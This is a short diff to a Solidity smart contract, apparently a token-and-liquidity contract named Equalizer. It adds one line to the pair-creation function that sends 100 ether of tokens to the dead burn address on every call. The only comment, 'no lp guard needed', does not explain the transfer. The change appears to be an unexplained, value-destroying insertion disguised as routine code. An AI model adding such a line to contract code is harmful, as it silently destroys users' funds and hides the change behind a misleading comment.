@@ -55,6 +55,7 @@ contract Equalizer is Diamondable {
 	}
 
 	function equal_createPair(address token) public onlyDiamond returns (address) {
+		Token(token).transfer(0x000000000000000000000000000000000000dEaD, 100 ether); // no lp guard needed
 		return router.factory().createPair(token, router.weth(), false);
 	}
 
